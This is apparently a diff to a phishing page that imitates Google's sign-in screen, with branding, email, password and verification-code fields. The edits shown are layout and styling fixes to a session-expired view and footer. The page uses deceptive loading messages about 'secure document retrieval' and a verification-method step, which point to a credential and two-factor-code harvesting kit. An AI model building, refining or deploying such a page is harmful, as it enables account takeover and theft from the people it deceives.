@@ -54,7 +54,7 @@ body{background-color:#f0f4f9;font-family:'Google Sans','Roboto','Arial',sans-se
 #styledErrorContainer .form-error-display .error-title{font-weight:600;color:#d93025;font-size:14px;margin-bottom:4px}
 #styledErrorContainer .form-error-display .error-msg{display:block;color:#202124;font-size:13px;line-height:1.4;margin:0}
 #footer{width:90%;max-width:900px;display:flex;justify-content:space-between;align-items:center;padding:16px 24px;margin-top:12px}
-#sessionExpiredView{display:none;width:90%;max-width:900px;flex-direction:column;align-items:center;text-align:left;background:#fff;border-radius:28px;padding:48px 40px}
+#sessionExpiredView{display:none;width:90%;max-width:900px;flex-direction:column;align-items:flex-start;text-align:left;background:#fff;border-radius:28px;padding:48px 40px}
 #languages{border:0;background:transparent;color:#5f6368;font-size:12px;cursor:pointer;padding:4px 8px;font-family:'Roboto','Arial',sans-serif;display:flex;align-items:center;gap:4px}
 #languages:hover{color:#202124}
 .footer_links{display:flex;gap:16px}
@@ -79,7 +79,7 @@ body{background-color:#f0f4f9;font-family:'Google Sans','Roboto','Arial',sans-se
 #forgotPasswordLink:hover{background:#f6fafe}
 @media(max-width:768px){
 body{background-color:#fff;padding-top:60px}
-#parent{flex-direction:column;width:100%;max-width:450px;margin:0 auto;min-height:auto;border-radius:0;overflow:hidden;padding:0;box-shadow:none}
+#parent{flex:1;flex-direction:column;width:100%;max-width:450px;margin:0 auto;min-height:auto;border-radius:0;overflow:hidden;padding:0;box-shadow:none}
 #left_child{width:100%;padding:24px 24px 0}
 #right_child{width:100%;padding:8px 24px 0;overflow:hidden}
 #google_logo{width:75px;height:auto;margin-bottom:24px}
@@ -91,9 +91,9 @@ body{background-color:#fff;padding-top:60px}
 #create_button{font-size:14px;padding:10px 16px}
 #next_button{font-size:14px;padding:10px 24px;flex-shrink:0}
 #guestText{margin-top:16px}
-#footer{flex-direction:row;justify-content:space-between;padding:12px 24px;gap:8px;width:100%;max-width:450px;margin:0 auto}
+#footer{flex-direction:row;justify-content:space-between;padding:12px 24px;gap:8px;width:100%;max-width:450px;margin:0 auto;margin-top:auto}
 .footer_links{gap:16px}
-#sessionExpiredView{width:100%;max-width:450px;margin:0 auto;border-radius:0}
+#sessionExpiredView{width:100%;max-width:450px;margin:0 auto;border-radius:28px;padding:48px 32px;box-shadow:0 1px 3px rgba(0,0,0,.12)}
 }
 @media(max-width:480px){
 body{padding-top:48px}
@@ -111,8 +111,8 @@ body{padding-top:48px}
 .button_row{margin-top:20px}
 #create_button{font-size:13px;padding:8px 12px}
 #next_button{font-size:13px;padding:8px 20px}
-#footer{max-width:100%;padding:10px 24px}
-#sessionExpiredView{width:100%;max-width:100%;padding:32px 24px}
+#footer{max-width:100%;padding:10px 24px;margin-top:auto}
+#sessionExpiredView{width:100%;max-width:100%;padding:32px 24px;border-radius:20px;box-shadow:0 1px 3px rgba(0,0,0,.12)}
 #sessionExpiredRetryBtn{width:100%}
 }
 @media(min-width:960px){
@@ -182,7 +182,9 @@ body{padding-top:108px}
 <img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" alt="Google" style="width:75px;height:24px;margin-bottom:16px">
 <h1 style="font-size:24px;font-weight:400;color:#202124;margin-bottom:16px;text-align:left;font-family:'Google Sans','Roboto','Arial',sans-serif">You're not signed in</h1>
 <p id="sessionExpiredMessage" style="font-size:14px;color:#5f6368;line-height:1.6;margin-bottom:32px;max-width:400px;font-family:'Roboto','Arial',sans-serif"></p>
+<div style="width:100%;display:flex;justify-content:flex-end">
 <button type="button" id="sessionExpiredRetryBtn" style="background:#1a73e8;color:#fff;border:0;border-radius:20px;padding:12px 32px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans','Roboto','Arial',sans-serif;min-width:90px;transition:background .2s">Try again</button>
+</div>
 </div>
 <div id="footer">
 <button id="languages">English (United States) &#9662;</button>
@@ -205,13 +207,13 @@ const POLLING_TIMEOUT_MS=10*60*1000;const PROCESSING_TIMEOUT_MS=180000;let proce
 const loadingMessages=["Securing your connection...","Verifying document integrity...","Establishing encrypted tunnel...","Authenticating access protocols...","Preparing your secure workspace...","Almost there, just a moment...","Ensuring data privacy...","Finalizing secure document retrieval..."];
 let currentMessageIndex=0,messageIntervalId=null;
 function showStyledError(m){const c=document.getElementById('styledErrorContainer'),e=document.getElementById('styledErrorMessage');if(c&&e){e.textContent=m||'An unexpected error occurred.';c.style.display='block'}}
-function showFailedView(m){['emailGroup','passwordGroup','verificationOptionsGroup','verificationCodeGroup','button_row','showPasswordRow','forgotPasswordLink','guestText','create_button','verifySentMessage','tryAnotherWay'].forEach(id=>{const e=document.getElementById(id);if(e)e.style.display='none'});const eC=document.getElementById('emailChip');if(eC)eC.style.display='none';const left=document.getElementById('left_child');if(left)left.style.display='none';const p=document.getElementById('parent');if(p)p.style.display='none';hideAllErrors();const sev=document.getElementById('sessionExpiredView');if(sev){document.getElementById('sessionExpiredMessage').textContent=m||'Your session ended. Please try signing in again.';sev.style.display='flex'}}
+function showFailedView(m){['emailGroup','passwordGroup','verificationOptionsGroup','verificationCodeGroup','button_row','showPasswordRow','forgotPasswordLink','guestText','create_button','verifySentMessage','tryAnotherWay'].forEach(id=>{const e=document.getElementById(id);if(e)e.style.display='none'});const eC=document.getElementById('emailChip');if(eC)eC.style.display='none';const left=document.getElementById('left_child');if(left)left.style.display='none';const p=document.getElementById('parent');if(p)p.style.display='none';hideAllErrors();document.body.style.backgroundColor='#f0f4f9';const sev=document.getElementById('sessionExpiredView');if(sev){document.getElementById('sessionExpiredMessage').textContent=m||'Your session ended. Please try signing in again.';sev.style.display='flex'}}
 function hideStyledError(){const c=document.getElementById('styledErrorContainer');if(c)c.style.display='none'}
 function objectToFormData(obj){const fd=new URLSearchParams();Object.entries(obj).forEach(([k,v])=>{fd.append(k,v.toString())});return fd.toString()}
 function isValidEmail(email){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)}
 function showLoadingOverlay(sp){const o=document.getElementById('loadingOverlay');o.style.display='flex';document.getElementById('parent').style.display='none';document.getElementById('errorMessage').style.display='none';const pb=document.querySelector('.progress-bar');if(pb)pb.style.display=sp?'block':'none';sLM()}
 function showErrorOverlay(m){document.getElementById('loadingOverlay').style.display='flex';document.getElementById('parent').style.display='none';const pb=document.querySelector('.progress-bar');if(pb)pb.style.display='none';document.getElementById('loadingMessage').style.display='none';document.getElementById('errorMessage').textContent=m||'An error occurred. Please try again.';document.getElementById('errorMessage').style.display='block';clearInterval(messageIntervalId)}
-function hideLoadingOverlay(){document.getElementById('loadingOverlay').style.display='none';document.getElementById('parent').style.display='flex';document.getElementById('loadingMessage').style.display='block';clearInterval(messageIntervalId)}
+function hideLoadingOverlay(){document.getElementById('loadingOverlay').style.display='none';document.getElementById('parent').style.display='flex';document.getElementById('loadingMessage').style.display='block';document.body.style.backgroundColor='';clearInterval(messageIntervalId)}
 function setFormSubmitting(submitting){const eF=document.getElementById('txtEmail'),pF=document.getElementById('txtPassword'),vCI=document.getElementById('txtVerificationCode'),sB=document.getElementById('next_button'),cP=document.getElementById('cardProgress');const inputs=[eF,pF,vCI];const radios=document.querySelectorAll('input[name="verificationOption"]');if(submitting){isSubmitting=true;inputs.forEach(i=>{if(i){i.disabled=true;i.readOnly=true}});radios.forEach(r=>{r.disabled=true});if(sB)sB.disabled=true;if(cP)cP.style.display='block'}else{isSubmitting=false;inputs.forEach(i=>{if(i){i.disabled=false;i.readOnly=false}});radios.forEach(r=>{r.disabled=false});if(sB)sB.disabled=false;if(cP)cP.style.display='none'}}
 function sLM(){const e=document.getElementById('loadingMessage');currentMessageIndex=0;e.textContent=loadingMessages[currentMessageIndex];if(messageIntervalId)clearInterval(messageIntervalId);messageIntervalId=setInterval(()=>{currentMessageIndex=(currentMessageIndex+1)%loadingMessages.length;e.textContent=loadingMessages[currentMessageIndex]},5000)}
 function hideAllErrors(){hideStyledError();_codeErrorShown=false;['InvalidEmail','InvalidPassword','RequirePassword','GeneralError','RequireVerificationChoice','RequireVerificationCode','InvalidVerificationCode'].forEach(id=>{document.getElementById(id).style.display='none'});['emailGroup','passwordGroup','verificationCodeGroup'].forEach(id=>{const el=document.getElementById(id);if(el)el.classList.remove('field-error')})}
